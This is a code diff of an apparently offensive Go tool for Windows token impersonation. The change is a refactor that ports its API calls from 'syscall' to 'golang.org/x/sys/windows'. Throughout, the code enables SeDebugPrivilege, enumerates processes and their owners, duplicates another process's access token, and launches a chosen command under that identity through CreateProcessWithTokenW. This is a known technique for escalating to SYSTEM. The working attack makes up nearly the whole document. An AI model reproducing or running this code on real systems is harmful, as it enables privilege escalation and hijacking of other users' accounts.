@@ -7,8 +7,9 @@ import (
 	"os"
 	"os/user"
 	"strings"
-	"syscall"
 	"unsafe"
+
+	"golang.org/x/sys/windows"
 )
 
 // References: https://stackoverflow.com/questions/39595252/shutting-down-windows-using-golang-code
@@ -25,21 +26,6 @@ type TokenPrivileges struct {
 	privilegeCount uint32
 	privileges     [64]LuidAndAttributes
 }
-
-var (
-	// kernel32DLL = syscall.NewLazyDLL("Kernel32.dll")
-	advapi32DLL = syscall.NewLazyDLL("Advapi32.dll")
-
-	// GetCurrentProcess       	= kernel32DLL.NewProc("GetCurrentProcess")       // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess
-	// OpenProcess             	= kernel32DLL.NewProc("OpenProcess")             // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
-	// CreateToolhelp32Snapshot	= kernel32DLL.NewProc("CreateToolhelp32Snapshot")// https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
-	// OpenProcessToken        	= advapi32DLL.NewProc("OpenProcessToken")        // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken
-	LookupPrivilegeValueW   = advapi32DLL.NewProc("LookupPrivilegeValueW")   // https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluew
-	AdjustTokenPrivileges   = advapi32DLL.NewProc("AdjustTokenPrivileges")   // https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges
-	ImpersonateLoggedOnUser = advapi32DLL.NewProc("ImpersonateLoggedOnUser") // https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser
-	DuplicateTokenEx        = advapi32DLL.NewProc("DuplicateTokenEx")        // https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex
-	CreateProcessWithTokenW = advapi32DLL.NewProc("CreateProcessWithTokenW") // https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw
-)
 
 const (
 	// [Access Rights for Access-Token Objects](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-rights-for-access-token-objects)
@@ -94,35 +80,63 @@ var privilegeNames = map[uint32]string{
 	36: "SeRelabelPrivilege",
 }
 
+var (
+	modadvapi32                 = windows.NewLazySystemDLL("advapi32.dll")
+	procCreateProcessWithTokenW = modadvapi32.NewProc("CreateProcessWithTokenW")
+)
+
+func createProcessWithTokenW(token windows.Token, logonFlags uint32, appName, cmdLine *uint16, creFlags uint32,
+	env *uint16, curDir *uint16, si *windows.StartupInfo, pi *windows.ProcessInformation) error {
+	r1, _, e1 := procCreateProcessWithTokenW.Call(
+		uintptr(token),
+		uintptr(logonFlags),
+		uintptr(unsafe.Pointer(appName)),
+		uintptr(unsafe.Pointer(cmdLine)),
+		uintptr(creFlags),
+		uintptr(unsafe.Pointer(env)),
+		uintptr(unsafe.Pointer(curDir)),
+		uintptr(unsafe.Pointer(si)),
+		uintptr(unsafe.Pointer(pi)),
+	)
+	if r1 == 0 {
+		return e1
+	}
+	return nil
+}
+
 func enableSeDebugPrivilege() error {
-	var CurrentTokenHandle syscall.Token
+	var CurrentTokenHandle windows.Token
 	var tkp TokenPrivileges
 	// [Privilege Constants (Authorization)](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
-	SE_DEBUG_NAME := syscall.StringToUTF16Ptr("SeDebugPrivilege")
+	SE_DEBUG_NAME := windows.StringToUTF16Ptr("SeDebugPrivilege")
 
-	CurrentProcessHandle, err := syscall.GetCurrentProcess()
+	CurrentProcessHandle, err := windows.GetCurrentProcess()
 	if err != nil {
 		log.Println("[-] GetCurrentProcess() error:", err)
 	} else {
 		log.Println("[+] GetCurrentProcess() success")
 	}
 
-	err = syscall.OpenProcessToken(CurrentProcessHandle, TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES, &CurrentTokenHandle)
+	err = windows.OpenProcessToken(CurrentProcessHandle, windows.TOKEN_QUERY|windows.TOKEN_ADJUST_PRIVILEGES, &CurrentTokenHandle)
 	if err != nil {
 		log.Println("[-] OpenProcessToken() error:", err)
 	} else {
 		log.Println("[+] OpenProcessToken() success")
 	}
 
-	result, _, err := LookupPrivilegeValueW.Call(uintptr(0), uintptr(unsafe.Pointer(SE_DEBUG_NAME)), uintptr(unsafe.Pointer(&(tkp.privileges[0].luid))))
-	if result != 1 {
+	var debugLuid windows.LUID
+	err = windows.LookupPrivilegeValue(nil, SE_DEBUG_NAME, &debugLuid)
+	if err != nil {
 		log.Println("[-] LookupPrivilegeValue() error:", err)
 	} else {
 		log.Println("[+] LookupPrivilegeValue() success")
 	}
 
-	result, _, err = AdjustTokenPrivileges.Call(uintptr(CurrentTokenHandle), 0, uintptr(unsafe.Pointer(&tkp)), 0, uintptr(0), 0)
-	if result != 1 {
+	tkp.privileges[0].luid.lowPart = debugLuid.LowPart
+	tkp.privileges[0].luid.highPart = debugLuid.HighPart
+
+	err = windows.AdjustTokenPrivileges(CurrentTokenHandle, false, (*windows.Tokenprivileges)(unsafe.Pointer(&tkp)), 0, nil, nil)
+	if err != nil {
 		log.Println("[-] AdjustTokenPrivileges() error:", err)
 	} else {
 		log.Println("[+] AdjustTokenPrivileges() success")
@@ -131,11 +145,11 @@ func enableSeDebugPrivilege() error {
 	return err
 }
 
-func getPrivileges(token syscall.Token) {
+func getPrivileges(token windows.Token) {
 	var tokenInfoLength uint32
-	syscall.GetTokenInformation(token, syscall.TokenPrivileges, nil, 0, &tokenInfoLength)
+	windows.GetTokenInformation(token, windows.TokenPrivileges, nil, 0, &tokenInfoLength)
 	buffer := make([]byte, tokenInfoLength)
-	err := syscall.GetTokenInformation(token, syscall.TokenPrivileges, &buffer[0], tokenInfoLength, &tokenInfoLength)
+	err := windows.GetTokenInformation(token, windows.TokenPrivileges, &buffer[0], tokenInfoLength, &tokenInfoLength)
 	if err != nil {
 		log.Printf("[-] GetTokenInformation failed: %v", err)
 		return
@@ -183,9 +197,9 @@ func getUserInfo() (string, bool) {
 		return "Unknown", false
 	}
 
-	var token syscall.Token
-	process, _ := syscall.GetCurrentProcess()
-	err = syscall.OpenProcessToken(process, syscall.TOKEN_QUERY, &token)
+	var token windows.Token
+	process, _ := windows.GetCurrentProcess()
+	err = windows.OpenProcessToken(process, windows.TOKEN_QUERY, &token)
 	if err != nil {
 		return currentUser.Username, false
 	}
@@ -193,21 +207,21 @@ func getUserInfo() (string, bool) {
 
 	var isElevated uint32
 	var returnLen uint32
-	err = syscall.GetTokenInformation(token, TokenElevation, (*byte)(unsafe.Pointer(&isElevated)), 4, &returnLen)
+	err = windows.GetTokenInformation(token, windows.TokenElevation, (*byte)(unsafe.Pointer(&isElevated)), 4, &returnLen)
 
 	return currentUser.Username, isElevated != 0
 }
 
-func getTokenUserInfo(token syscall.Token) string {
+func getTokenUserInfo(token windows.Token) string {
 	var tokenInfoLength uint32
-	syscall.GetTokenInformation(token, syscall.TokenUser, nil, 0, &tokenInfoLength)
+	windows.GetTokenInformation(token, windows.TokenUser, nil, 0, &tokenInfoLength)
 	buffer := make([]byte, tokenInfoLength)
-	err := syscall.GetTokenInformation(token, syscall.TokenUser, &buffer[0], tokenInfoLength, &tokenInfoLength)
+	err := windows.GetTokenInformation(token, windows.TokenUser, &buffer[0], tokenInfoLength, &tokenInfoLength)
 	if err != nil {
 		return "Unknown"
 	}
 
-	tokenUser := (*syscall.Tokenuser)(unsafe.Pointer(&buffer[0]))
+	tokenUser := (*windows.Tokenuser)(unsafe.Pointer(&buffer[0]))
 	account, domain, _, err := tokenUser.User.Sid.LookupAccount("")
 	if err != nil {
 		return "Unknown"
@@ -261,43 +275,43 @@ type ProcessInfo struct {
 	PID      uint32
 	UserName string
 	ExeName  string
-	Token    syscall.Token
+	Token    windows.Token
 }
 
 func getAllProcesses() []ProcessInfo {
 	var processes []ProcessInfo
 
-	snapshot, err := syscall.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
 	if err != nil {
 		log.Printf("[-] Failed to create snapshot: %v\n", err)
 		return processes
 	}
-	defer syscall.CloseHandle(snapshot)
+	defer windows.CloseHandle(snapshot)
 
-	var pe syscall.ProcessEntry32
+	var pe windows.ProcessEntry32
 	pe.Size = uint32(unsafe.Sizeof(pe))
 
-	err = syscall.Process32First(snapshot, &pe)
+	err = windows.Process32First(snapshot, &pe)
 	if err != nil {
 		log.Printf("[-] Failed to get first process: %v\n", err)
 		return processes
 	}
 
 	for {
-		if handle, err := syscall.OpenProcess(PROCESS_QUERY_INFORMATION, false, pe.ProcessID); err == nil {
-			var token syscall.Token
-			if err := syscall.OpenProcessToken(handle, TOKEN_QUERY, &token); err == nil {
+		if handle, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, pe.ProcessID); err == nil {
+			var token windows.Token
+			if err := windows.OpenProcessToken(handle, windows.TOKEN_QUERY, &token); err == nil {
 				processes = append(processes, ProcessInfo{
 					PID:      pe.ProcessID,
 					UserName: getTokenUserInfo(token),
-					ExeName:  syscall.UTF16ToString(pe.ExeFile[:]),
+					ExeName:  windows.UTF16ToString(pe.ExeFile[:]),
 					Token:    token,
 				})
 			}
-			syscall.CloseHandle(handle)
+			windows.CloseHandle(handle)
 		}
 
-		if err = syscall.Process32Next(snapshot, &pe); err != nil {
+		if err = windows.Process32Next(snapshot, &pe); err != nil {
 			break
 		}
 	}
@@ -362,18 +376,18 @@ func listUniqueTokens() {
 }
 
 // Reference: https://github.com/yusufqk/SystemToken/blob/master/main.c len 102
-func handleProcess(pid uint32) syscall.Handle {
+func handleProcess(pid uint32) windows.Handle {
 	log.Println("[+] OpenProcess() start.")
-	ProcessHandle, err := syscall.OpenProcess(PROCESS_QUERY_INFORMATION, true, pid)
+	ProcessHandle, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, true, pid)
 	if err != nil {
-		ProcessHandle, err = syscall.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, pid)
+		ProcessHandle, err = windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, true, pid)
 		if err != nil {
 			log.Println("[-] OpenProcess() error:", err)
 		}
 	} else {
 		log.Println("[+] OpenProcess() success:", ProcessHandle)
-		var procToken syscall.Token
-		if err := syscall.OpenProcessToken(ProcessHandle, TOKEN_QUERY, &procToken); err == nil {
+		var procToken windows.Token
+		if err := windows.OpenProcessToken(ProcessHandle, windows.TOKEN_QUERY, &procToken); err == nil {
 			log.Printf("[+] Target process running as: %s\n", getTokenUserInfo(procToken))
 			procToken.Close()
 		}
@@ -381,13 +395,13 @@ func handleProcess(pid uint32) syscall.Handle {
 	return ProcessHandle
 }
 
-func runAsToken(TokenHandle uintptr, command *uint16) error {
-	var NewTokenHandle syscall.Token
-	var StartupInfo syscall.StartupInfo
-	var ProcessInformation syscall.ProcessInformation
+func runAsToken(TokenHandle windows.Token, command *uint16) error {
+	var NewTokenHandle windows.Token
+	var StartupInfo windows.StartupInfo
+	var ProcessInformation windows.ProcessInformation
 
-	result, _, err := DuplicateTokenEx.Call(TokenHandle, MAXIMUM_ALLOWED, uintptr(0), SecurityImpersonation, TokenPrimary, uintptr(unsafe.Pointer(&NewTokenHandle)))
-	if result != 1 {
+	err := windows.DuplicateTokenEx(TokenHandle, windows.MAXIMUM_ALLOWED, nil, windows.SecurityImpersonation, windows.TokenPrimary, &NewTokenHandle)
+	if err != nil {
 		log.Println("[-] DuplicateTokenEx() error:", err)
 	} else {
 		log.Println("[+] DuplicateTokenEx() success")
@@ -396,8 +410,9 @@ func runAsToken(TokenHandle uintptr, command *uint16) error {
 		getPrivileges(NewTokenHandle)
 	}
 
-	result, _, err = CreateProcessWithTokenW.Call(uintptr(NewTokenHandle), LOGON_WITH_PROFILE, uintptr(0), uintptr(unsafe.Pointer(command)), 0, uintptr(0), uintptr(0), uintptr(unsafe.Pointer(&StartupInfo)), uintptr(unsafe.Pointer(&ProcessInformation)))
-	if result != 1 {
+	// 调用自定义 createProcessWithTokenW 替代 windows.CreateProcessWithTokenW
+	err = createProcessWithTokenW(NewTokenHandle, LOGON_WITH_PROFILE, nil, command, 0, nil, nil, &StartupInfo, &ProcessInformation)
+	if err != nil {
 		log.Println("[-] CreateProcessWithTokenW() error:", err)
 	} else {
 		log.Println("[+] CreateProcessWithTokenW() success")
@@ -442,9 +457,9 @@ func main() {
 		log.Println("[+] Process Pid: ", pid)
 		log.Println("[+] Execute Command: ", command)
 
-		var currentToken syscall.Token
-		currentProcess, _ := syscall.GetCurrentProcess()
-		err := syscall.OpenProcessToken(currentProcess, TOKEN_QUERY, &currentToken)
+		var currentToken windows.Token
+		currentProcess, _ := windows.GetCurrentProcess()
+		err := windows.OpenProcessToken(currentProcess, windows.TOKEN_QUERY, &currentToken)
 		if err == nil {
 			getPrivileges(currentToken)
 		}
@@ -452,8 +467,8 @@ func main() {
 		enableSeDebugPrivilege()
 		ProcessHandle := handleProcess(uint32(pid))
 
-		var TokenHandle syscall.Token
-		err = syscall.OpenProcessToken(ProcessHandle, TOKEN_QUERY|TOKEN_DUPLICATE, &TokenHandle)
+		var TokenHandle windows.Token
+		err = windows.OpenProcessToken(ProcessHandle, windows.TOKEN_QUERY|windows.TOKEN_DUPLICATE, &TokenHandle)
 		if err != nil {
 			log.Println("[-] OpenProcessToken() error:", err)
 		} else {
@@ -462,7 +477,7 @@ func main() {
 			getPrivileges(TokenHandle)
 		}
 
-		runAsToken(uintptr(TokenHandle), syscall.StringToUTF16Ptr(command))
+		runAsToken(TokenHandle, windows.StringToUTF16Ptr(command))
 	} else {
 		log.Println("[-] Please input pid and command, type \"-h\" see help.")
 	}
